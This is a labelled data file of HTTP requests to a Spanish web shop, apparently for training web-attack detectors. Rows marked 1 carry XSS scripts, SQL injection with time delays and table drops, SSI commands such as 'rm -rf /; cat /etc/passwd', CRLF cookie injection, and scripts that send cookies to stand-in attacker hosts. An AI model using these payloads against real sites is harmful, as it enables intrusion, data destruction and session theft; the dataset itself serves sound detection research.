localhost : 8080 / tienda1 / miembros / editar . jsp / asf - logo - wide . bak,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = queso + manchego & precio = 39 /  & cantidad = 37 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = hurtubis & password = reexpedición & nombre = juliana & apellidos = pertinez + borrell & email = oberg - fierro9 @ adscrito . gi & dni = 04121787a & direccion = genezaret + 183 + 1g & ciudad = villacidaler & cp = 08512 & provincia = cádiz & ntc = 2250818765118675 & b1 = registrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = zaid & password = 0504na5 & nombre = peñimel & apellidos = jenuario + guayran & email = deghy @ ringringcargo . gs & dni = 26133663m & direccion = calle + museo ,  + 12 +  & ciudad = santa + coloma + de + gramenet & cp = 16879 & provincia = zamora & ntc = 8924497568249335 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = okuzawa & password = 139iar & nombre = amancay & apellidos = basoco & email = nagel - bory @ multasdetransito . vi & dni = 04017886q & direccion = alejandrina + moran ,  + 2 ,  +  & ciudad = incio ,  + o & cp = 43694 & provincia = teruel & ntc = 8676876011541874 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = bob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & pwd = diligencia & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 843 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 39 /  & cantidad = 78 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 715 & b1a = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 85 & cantidad = 82 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6978 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jspida = 2 & nombre = queso + manchego & precio = 100 & cantidad = 65 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 85 & cantidad = 6 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / miembros / fotos . jsp / 6909030637832563290 . jsp . old,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = thimothy2 & pwd = e3ec05d8 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 85 & cantidad = 95 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = deek & password =  '  '  ' toza!r & nombre = salina & apellidos = girón + ceceñas & email = un - hi @ tarifasdevuelos . et & dni = 55199080t & direccion = tecla + sala + 74 +  & ciudad = castrillo + de + villavega & cp = 18818 & provincia = málaga & ntc = 7068244348344945 & b1 = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & logina = checinsk & password = c2ad953u8ro & nombre = neria & apellidos = taronger & email = torgov - mattera @ yksoluap . edu & dni = 74014005m & direccion = avenida + roque + de + gando ,  + 193 ,  + 7 ? e & ciudad = castrobol & cp = 26324 & provincia = cuenca & ntc = 5680554856223107 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = yokono5 & pwd = !ent / rep96ad8 & remember = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = nyre & password = ma7ordoma & nombre = olidia & apellidos = gómez + viroles & email = godfrey - pughe @ magichobby . nf & dni = 98150433a & direccion = carretera + de + serin + 196 ,  +  & ciudad = granollers & cp = 37260 & provincia = cáceres & ntc = 7434846807193108 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = salibi & password = 85859i9n & nombre = estefan & apellidos = pacheco & email = cravat - close @ blogsmegumi . web & dni = 55162941v & direccion = gaspar + quiles + pascual + 195 ,  +  & ciudad = villafuerte & cp = 24230 & provincia = cuenca & ntc = 6577380187990722 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 /  & nombre = vino + rioja & precio = 39 & cantidad = 66 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = koeller & password = h5rt2ra & nombre = betsabé & apellidos = tubert & email = orlov @ maletti . dm & dni = 41738081g & direccion = c /  + gran + pez ,  + 167 ,  +  & ciudad = santiz & cp = 32781 & provincia = castellón & ntc = 9851892046707743 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = tarra & password = bienh6dado & nombre = idalia & apellidos = pozo + carbot & email = dafinescu @ saavedradiaz . gf & dni = 43841813h ""  + and +  "" 1 ""  =  "" 1 & direccion = avinguda + marques + de + montroig + 110 + 11 - a & ciudad = novés & cp = 46370 & provincia = zamora & ntc = 3085190282266683 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = kanies & password = ñarusa & nombre = iliana & apellidos = holzmann & email = berova @ mataluenga . cl & dni = 17377868b & direccion = grupo + baleares + astilleros + 110 ,  +  & ciudad = atapuerca & cp = 19198 & provincia = castellón & ntc = 0874962517729568 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = bawek & pwd = to2i5ue3o & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / vaciar . jsp ? b2 = vaciar + carrito ""  + and +  "" 1 ""  =  "" 1",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = olson & password = confesuría & nombre = aberardo & apellidos = segovia & email = raya @ acumulador . com . iq & dni = 06076324t & direccion = calle + atarfeño ,  + 1 + 15 ,  +  & ciudad = marugán & cp = 15589 & provincia = lleida & ntc = 0903154438828489 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = cristion & pwd = h2dr /  , os55t64amente & remember = off & b1 = entrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = joete & pwd = p7le3nt / 5 / log6a & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login =  ? va / rennes & pwd = cicerone & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = hanneke & pwd = deshiladiz & remember =  |  & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = rriocard & password = botionda & nombre = saira & apellidos = alférez + xuarra & email = christopher @ englishiseasy . mh & dni = 63899294g & direccion = pl .  + escritoras ,  + 88 +  & ciudad = valhermoso & cp = 10690 & provincia = alicante & ntc = 2278100372967643 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / entrar . jsperrormsg =  '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = kishore & password = ant5ayer & nombre = oberto & apellidos = venegas + callarisa & email = vennera - croix @ hacia . ru & dni = 81753434a & direccion = c /  + morales + del + espino + 123 ,  + 4 - e & ciudad = orotava ,  + la & cp = 46267 & provincia = zamora & ntc = 0630515936517830 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = vallozzi7 & password = 08nj703u0a20ra & nombre = talyi & apellidos = llenes & email = line @ psicoencuentronline . ws & dni = 87849806h & direccion = c /  + francisco + leandro + viana ,  + 173 ,  + 6 ? f & ciudad = cañamero & cp = 14857 & provincia = segovia & ntc = 3013947633577175 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & precio = 9874 & b1 = confirmar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = moledina & pwd = arrela & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = norczen & password = cu4a1 & nombre = dayana & apellidos = de + león + pizano & email = maclachlan @ sindns . ar & dni = 61570579q & direccion = passatge + vinyeta + 169 +  & ciudad = manzanares + el + real & cp = 18730 & provincia = cantabria & ntc = 2568324147640800 & b1 = registrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodoa = registro & login = thurgood & password = brucio & nombre = ronit & apellidos = agujetas + kercooff & email = ecker @ programasalquilermaquinaria . co & dni = 11845322t & direccion = calle + grases ,  + 93 ,  + 3 - c & ciudad = vallesa + de + la + guareña & cp = 29650 & provincia = burgos & ntc = 2614053201757076 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = sook9 & pwd = paraguayana & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 3 & b1a = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 85 & cantidad = 40 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = bry & password = desterrada & nombre = fabriciano & apellidos = párraga + bricat & email = kleiman . kanze @ chaqueta . com . is & dni = 64747115e & direccion = camino + punta + al + mar ,  + 150 +  & ciudad = villalube & cp = 20491 & provincia = sevilla & ntc = 5546525855546960 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = asbjorn & pwd = virulenta & remember = on & b1 = entrar % 3cscript % 3ealert % 28 % 22paros % 22 % 29 % 3b % 3c % 2fscript % 3e,1
"localhost : 8080 / tienda1 / publico / caracteristicas . jspid =  < script > alert (  "" paros ""  )  ;  <  / script > ",1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = trees & password = c46reter5 & nombre = nasime & apellidos = clua + conoto & email = wagoner4 @ hiperespaña . so & dni = 08379855n & direccion = calle + pedro + benito + 105 +  & ciudad = igea & cp = 04640 & provincia = soria & ntc = 3861725393323478 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1211 & b1 = pasar + por + caja / ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = ealasaid & password = esmol _ a & nombre = yamil & apellidos = ribet & email = merli @ powerthink . cv & dni = 36815238n & direccion = plza .  + santa + maria + soledad + torres + acosta + 165 + 1 ? h & ciudad = riba + de + escalote ,  + la & cp = 43140 & provincia = navarra & ntc = 6082149348845394 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / caracteristicas . jspid = 2 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = nagys & password = ajornalar & nombre = luciliano & apellidos = peraza & email = hope @ forohh . je & dni = 34917074s & direccion = escalinata + de + la + vega ,  + 29 + 2 ? g & ciudad = alcora ,  + l '  & cp = 31480 & provincia = segovia & ntc = 7798830482708782 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = vino + rioja & precio = 100 & cantidad = 22 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = pezzullo & password = 3s3lavo3ía & nombre = cipriana & apellidos = maza + de + lizana + busqueta & email =  % 20 & dni = 86251880v & direccion = calle + nuria ,  + 8 ,  +  & ciudad = castrillo - tejeriego & cp = 29715 & provincia = toledo & ntc = 7846720837144073 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = vanderbi & password = brechar & nombre = rudolph & apellidos = simo + baixaulí & email = guarneros @ elfisioencasa . eu & dni = 07929654j & direccion = d '  + irlanda ,  + 150 ,  + 4g & ciudada = cruïlles ,  + monells + i + sant + sadurní + de + l ' heura & cp = 22362 & provincia = palencia & ntc = 7146200335863301 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp / asf - logo - wide . gif /  . bak,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = datas & password = amover & nombre = helios & apellidos = piccech + rybar & email = lande - helpman @ evasor . dm & dni = 10691433k & direccion = pl .  + parroquia ,  + 111 ,  +  & ciudad = chucena & cp = 32320 & provincia = badajoz & ntc = 6028926654882066 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = burcew & pwd = luminiscencia & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = mobley & pwd = esc1lo6 - i1 & remembera = off & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = maludzin & password =  * hintero & nombre = isauroand + 1 = 1 & apellidos = cózar + ortega & email = knaup @ ilusionarium . by & dni = 30143184m & direccion = cerro + animas + 199 ,  + 8 ? g & ciudad = bentarique & cp = 08270 & provincia = teruel & ntc = 5095373752411795 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = garret & pwd = relsa & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = wenham & password = conde2s80te & nombre = valeria & apellidos = valero + tolaba & email = goldner - gadsdon @ candidaturaolle - futuronotarial . eu & dni = 66020343q & direccion = plza .  + altozano + 72 ,  +  & ciudad = tragacete & cp = 16639 & provincia = burgos & ntc = 0271947450207950 & b1 = sessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script > ",1
localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = credenciales + incorrectas % 20,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = doralynn & password = bast5d6r & nombre = artemio & apellidos = kucich + graugés & email = carlsson - bozonnet5 @ tiendasyofertas . sz & dni = 75985172a & direccion = c /  + sabugo ,  + 157 ,  +  & ciudad = baños + de + montemayor & cp = 22270 & provincia = ourense & ntc = 9993400463811014 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = giguere7 & password = carril6da & nombre = georgia & apellidos = patiño + ondorica & email = lahbib _ hodo @ silver - knights . ie & dni = 92963540r & direccion = c /  + mossen + jaume + pons + 32 ,  +  & ciudad = sant + joan + les + fonts & cp = 43248 & provincia = cuenca & ntc = 1320849277129751 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4184 & b1 = confirmarany % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a,1
"localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico < script > alert (  "" paros ""  )  ;  <  / script >  & precio = 39 & cantidad = 81 & b1 = añadir + al + carrito",1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = queso + manchego & precio = 85 & cantidad =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = añadir + al + carrito",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = abel & password = entresijo & nombre = divico & apellidos = tutusaus & email = martlew _ vera - ellen @ acch - portugal . as & dni = 66809608j & direccion = c /  + santa + teresa + de + avila ,  + 5 ,  + 3 ? c & ciudad = arnuero & cp = 02439 & provincia = cantabria & ntc = 1820193328818228 & b1 = registrar",0
localhost : 8080 / patient / login . do,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = turing & pwd = b2q8438 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = 2 % 3cscript % 3ealert % 28 % 22paros % 22 % 29 % 3b % 3c % 2fscript % 3e,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = brittan & password = al9mb + 532 & nombre = onila & apellidos = furcat + zarco & email = greiff @ opticaweb . bu & dni = 36455660q & direccion = calle + nueve + 57 +  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & ciudad = utiel & cp = 01899 & provincia = madrid & ntc = 0088492463086794 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = emmeline4 & password = ultramun * dana & nombre = sofía & apellidos = huitron + escalona & email = win @ yes123 . bn & dni = 95195528t & direccion = calle + generalife + s / n + 12 ? d & ciudad = santa + cruz + de + mudela & cp = 24325 & provincia = cantabria & ntc = 1891589695823279 & b1 = registrar,0
"localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 85 & cantidad = 80 < script > alert (  "" paros ""  )  ;  <  / script >  & b1 = añadir + al + carrito",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6717 & b1 = confirmar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = douville3 & password = 3sca93z7 & nombre = zaima & apellidos = naudi & email = prim - hobson @ almascanarias . bi & dni = 70147736j & direccion = c /  + lope + gemeno + 39 ,  +  & ciudad = burgo + ranero ,  + el & cp = 28815 & provincia = huesca & ntc = 2712197915970613 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = jamón + ibérico & precio = 100 & cantidad = 41 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = shonuck & password = 9r3h7laú8 & nombre = hortencia & apellidos = mañé + moscoso & email = valadez @ gaudio . bj & dni = 81703579n & direcciona = poligono + amargacena + 141 +  & ciudad = hita & cp = 06658 & provincia = barcelona & ntc = 7343251905864691 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 40 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8384 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & nombre = jamón + ibérico & precio = 100 & cantidad = 97 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 562 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = marasliy & password = agu5d92a & nombre = sharom & apellidos = biaña + pomares & email = lazzaro _ hardin @ naturalagricolacantabria . vc & dni = 63637869c & direccion = c /  + sevilla ,  + 45 + 4c & ciudad = pertusa & cp = 43718 & provincia = zamora & ntc = 4105205025773438 @ 40 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 5151 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 39 /  & cantidad = 65 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = hisko & pwd = misionera & remember = off & b1a = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja % 3cscript % 3ealert % 28 % 22paros % 22 % 29 % 3b % 3c % 2fscript % 3e & precio = 85 & cantidad = 84 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7436 & b1 = confirmar '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ,1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp / 6909030637832563290 . jsp ~ ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = yung - fu & password = 8ach35 & nombre = atico & apellidos = farzati + bolàs & email = gobert @ olvidalo . sh & dni = 87238782n & direccion = calle + salamanca ,  + 147 ,  + 12 - c & ciudad = llacuna ,  + la & cp = 42192 & provinciaa = la + rioja & ntc = 6202220690818816 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 100 /  & cantidad = 15 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / asf - logo - wide . gif /  . bak,1
"localhost : 8080 / tienda1 / publico / entrar . jsperrormsg =  ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  < ",1
localhost : 8080 / tienda1 / miembros / editar . jsp / asf - logo - wide . java,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 /  & nombre = jamón + ibérico & precio = 100 & cantidad = 86 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8409 & b1 = pasar + por + caja / ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = nicolo & passworda = corconera & nombre = pastora & apellidos = cruillas & email = damboise @ automovilesalhambra . co & dni = 59569586t & direccion = iruña + 43 ,  +  & ciudad = cervera + del + llano & cp = 18614 & provincia = santa + cruz + de + tenerife & ntc = 6204495616575478 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4970 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar % 20 & login = sundar & pwd = respetosa & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ramah & pwd = enternecimiento & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = toole & pwd = e9ternecer & remember = on & b1a = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 816sessionid = 12312312 &  + username =  % 3c % 73 % 63 % 72 % 69 % 70 % 74 % 3e % 64 % 6f % 63 % 75 % 6d % 65 % 6e % 74 % 2e % 6c % 6f % 63 % 61 % 74 % 69 % 6f % 6e % 3d % 27 % 68 % 74 % 74 % 70 % 3a % 2f % 2f % 61 % 74 % 74 % 61 % 63 % 6b % 65 % 72 % 68 % 6f % 73 % 74 % 2e % 65 % 78 % 61 % 6d % 70 % 6c % 65 % 2f % 63 % 67 % 69 % 2d % 62 % 69 % 6e % 2f % 63 % 6f % 6f % 6b % 69 % 65 % 73 % 74 % 65 % 61 % 6c % 2e % 63 % 67 % 69 % 3f % 27 % 2b % 64 % 6f % 63 % 75 % 6d % 65 % 6e % 74 % 2e % 63 % 6f % 6f % 6b % 69 % 65 % 3c % 2f % 73 +  % 63 % 72 % 69 % 70 % 74 % 3e ?  & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = farris & pwd = sanguinario & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = marymarg & password = r04e50 & nombre = ronnie & apellidos = puigferrer + ulldemol & email = zurica @ zaya . sr & dni = 03301687z & direccion = calle + malva + 1 ,  + 4 - h & ciudad = chagarcía + medianero & cp = 37520 & provincia = burgos & ntca = 1272948221132397 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 7930 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8324 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = brodfueh & pwd = engurria & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1797 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1515 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = thorn & pwd = carpi1ter5a & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1899 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = tres - sup & pwd = 8 , ifíc6l & remember = on & b1 = entrar",1
"localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = 2 < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  > ",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 /  & nombre = jamón + ibérico & precio = 39 & cantidad = 17 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = gerladin & password = 3uaj5d60l0 & nombre = garcilasco & apellidos = nistal + cañola & email = rebasa . mapes @ triplectextil . fk & dni = 00423300p & direccion = c /  + cantabria + 80 ,  +  & ciudad = bocairent & cp = 46726 & provincia = asturias & ntc = 6785240451609058 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = nguyet & password = c55i1ur1 & nombre = fiona & apellidos = dawaher & email = coran @ softwaremasservicio . sb & dni = 19614047s & direccion = c /  + quintana ,  + 48 ,  + 8 - d & ciudad = manzaneque & cp = 43747 & provincia = ávila & ntc = 4073524812403605 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = castro - h & password = entre8e58r & nombre = deserée & apellidos = peró & email = auric @ cafedeteatro . um & dni = 04549087d & direccion = luis + montoto + 38 ,  +  & ciudad = moriscos & cp = 09199 & provincia = burgos & ntc = 8277692168362297 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 1611 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio =  @ 40 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / anadir . jspid = 3 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & nombre = queso + manchego & precio = 100 & cantidad = 2 & b1 = añadir + al + carrito",1
"localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 67 & b1 =  < ! -  -  # exec + cmd =  "" ls +  /  ""  -  -  > ",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = clentice3 & password = cal5v9r7a0 & nombre = leonarda & apellidos = armengol + porto & email = beck - gaden @ asociaciondearquitectoslatinoamericanos . ch & dni = 76844031l & direccion = postigo + de + la + cuna ,  + 159 +  & ciudad = rebollosa + de + jadraque & cp = 34257 & provincia = zaragoza & ntc = 6574384578961467 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 100any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & cantidad = 47 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = arro & pwd = carminar & remember = on & b1a = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = snowden & password = in843ct43827e & nombre = artaldo & apellidos = alou & email = lillie @ canovash . ro & dni = 28186397n & direccion = alqueria + de + cachondo + 143 ,  + 4 ? h & ciudad = pola + de + gordón ,  + la & cp = 46669 & provincia = valencia & ntc = 0797657649779918 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = lodesert & password = herramienta & nombre = edelmira & apellidos = capo + garcía & email = bugbee @ farma - job . cd & dni = 55645514g & direccion = c /  + santander + s / n ,  +  & ciudad = roca + de + la + sierra ,  + la & cp = 05289 & provincia = badajoz & ntc = 4927358900726396 & b1 = registrarany % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235",1
